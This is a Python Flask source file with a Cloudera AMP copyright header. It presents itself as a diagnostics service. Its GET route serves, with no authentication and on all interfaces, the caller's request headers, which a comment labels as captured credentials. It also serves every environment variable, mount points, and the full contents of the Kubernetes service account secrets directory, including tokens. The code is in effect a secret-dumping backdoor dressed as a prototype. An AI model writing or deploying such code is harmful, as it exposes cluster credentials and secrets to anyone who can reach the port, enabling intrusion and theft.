# ###########################################################################
#
#  CLOUDERA APPLIED MACHINE LEARNING PROTOTYPE (AMP)
#  (C) Cloudera, Inc. 2021
#  All rights reserved.
#
# ###########################################################################

import os
from flask import Flask, request, jsonify, Response

app = Flask(__name__)

# ==========================================
# Helper Functions (Retained from original)
# ==========================================
def get_directory_contents(path):
    """Helper to list all files safely."""
    try:
        if os.path.exists(path):
            return os.listdir(path)
        else:
            return f"Error: Path '{path}' does not exist."
    except Exception as e:
        return f"Error: {str(e)}"

def get_mount_points():
    """Helper to read active system mount points."""
    mounts = []
    try:
        if os.path.exists('/proc/mounts'):
            with open('/proc/mounts', 'r') as f:
                for line in f:
                    parts = line.split()
                    if len(parts) >= 3:
                        mounts.append({
                            "device": parts[0],
                            "mount_point": parts[1],
                            "filesystem_type": parts[2]
                        })
            return mounts
        else:
            return "Error: /proc/mounts not available."
    except Exception as e:
        return f"Error reading mount points: {str(e)}"

def get_kubernetes_secrets():
    """Lists files and dumps contents of the K8s service account directory."""
    target_dir = '/run/secrets/kubernetes.io/serviceaccount'
    data = {"directory_exists": False, "files_discovered": [], "file_contents": {}}
    if not os.path.exists(target_dir):
        return "Error: Service account directory not found."
    data["directory_exists"] = True
    try:
        files = os.listdir(target_dir)
        data["files_discovered"] = files
        for file_name in files:
            full_path = os.path.join(target_dir, file_name)
            if os.path.isfile(full_path):
                try:
                    with open(full_path, 'r', errors='replace') as f:
                        data["file_contents"][file_name] = f.read().strip()
                except Exception as e:
                    data["file_contents"][file_name] = f"Error: {str(e)}"
        return data
    except Exception as e:
        return f"Error reading directory structure: {str(e)}"

# ==========================================
# Routes
# ==========================================
@app.route('/', methods=['GET'])
def diagnostics():
    """Handle incoming GET requests and return system diagnostics."""
    # CAPTURE USER CREDENTIALS/HEADERS
    incoming_headers = dict(request.headers)
    
    # Assemble the full diagnostics payload
    payload = {
        "endpoint_visitor_headers": incoming_headers,
        "environment_variables": dict(os.environ),
        "mount_points": get_mount_points(),
        "kubernetes_serviceaccount": get_kubernetes_secrets(),
        "tmp_contents": get_directory_contents('/tmp'),
        "home_cdsw_contents": get_directory_contents('/home/cdsw')
    }
    
    # Flask's jsonify automatically sets the Content-Type to application/json
    return jsonify(payload)

@app.route('/', methods=['POST'])
def debug_post():
    """Handle incoming POST requests with JSON payloads."""
    # Ensure the request contains JSON data
    if not request.is_json:
        return Response("Bad Request: Payload must be JSON\n", status=400, mimetype='text/plain')
    
    payload = request.get_json()
    
    # Ensure the JSON is a dictionary (JSON object)
    if not isinstance(payload, dict):
        return Response("Bad Request: JSON payload must be an object\n", status=400, mimetype='text/plain')

    # Format the text response
    response_lines = [
        f"DEBUG_KEY: {key} and DEBUG_VALUE : {value}"
        for key, value in payload.items()
    ]
    response_text = "\n".join(response_lines) + "\n"
    
    # Return as plain text
    return Response(response_text, status=200, mimetype='text/plain')

# ==========================================
# Execution
# ==========================================
if __name__ == '__main__':
    # Hardcoded port 8080 as mandated
    app.run(host='0.0.0.0', port=8080)
